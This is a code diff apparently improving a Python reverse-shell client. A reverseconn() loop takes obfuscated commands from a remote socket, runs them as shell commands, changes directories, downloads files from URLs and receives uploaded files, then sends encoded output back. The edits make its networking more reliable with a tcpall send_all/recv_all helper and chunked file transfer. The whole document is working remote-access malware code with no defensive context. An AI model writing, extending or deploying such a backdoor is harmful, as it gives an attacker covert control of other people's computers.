@@ -5,6 +5,7 @@ import select
 import time
 import ctypes
 import urllib
+import tcpall
 
 s=socket.socket()
 
@@ -12,23 +13,35 @@ def download(url,fname):
 
     urllib.urlretrieve(url,fname)
 
+    global s
+
+    tcpall.send_all(s,b'ACK')
+
 def frecv(sck):
 
-    fname=sck.recv(1024)
+    fsize=int(sck.recv(1024).decode())
 
-    sck.send(b'OK')
+    if(fsize%1024)==0:
 
-    fname=fname.decode()
+        riter=int(fsize/1024)
 
-    fsize=sck.recv(1024)
+    else:
 
-    sck.send(b'OK')
+        riter=int(fsize/1024)+1
+
+    sck.send(str.encode('ack'))
+
+    fname=sck.recv(1024).decode()
+
+    sck.send(str.encode('ack'))
 
     fhandle=open(fname,'wb')
 
-    fhandle.write(sck.recv(int(fsize.decode())))
+    for i in range(riter):
 
-    sck.send(b'OK')
+        fhandle.write(sck.recv(1024))
+
+    sck.send(str.encode('ack'))
 
     fhandle.close()
 
@@ -84,13 +97,19 @@ def reverseconn():
 
     while True:
 
-        recvcmd=s.recv(2**24)
+        recvcmd=tcpall.recv_all(s)
 
         if dec(recvcmd[:2].decode("utf-8"))=="cd":
 
-            os.chdir(dec(recvcmd[3:].decode("utf-8")))
+            try:
 
-            s.send(str.encode(enc(str(os.getcwd())+'> ')))
+                os.chdir(dec(recvcmd[3:].decode("utf-8")))
+
+            except:
+
+                pass
+
+            tcpall.send_all(s,str.encode(enc(str(os.getcwd())+'> ')))
 
         elif dec(recvcmd.decode("utf-8"))=="quit":
 
@@ -102,7 +121,7 @@ def reverseconn():
 
         elif dec(recvcmd[:8].decode("utf-8"))=="download":
 
-            download(dec(recvcmd[9:].decode("utf-8")),dec(s.recv(1024).decode("utf-8")))
+            download(dec(recvcmd[9:].decode("utf-8")),dec(tcpall.recv_all(s,1024).decode("utf-8")))
 
         elif len(recvcmd)>0 and dec(recvcmd[:2].decode("utf-8"))!="cd":
 
@@ -110,9 +129,9 @@ def reverseconn():
 
             obyte=cmd.stdout.read()+cmd.stderr.read()
 
-            ostr=str(obyte)
+            ostr=obyte.decode()
 
-            s.send(str.encode(enc(ostr+str(os.getcwd())+'> ')))
+            tcpall.send_all(s,str.encode(enc(ostr+str(os.getcwd())+'> '),"utf-8"))
 
     s.close()
 
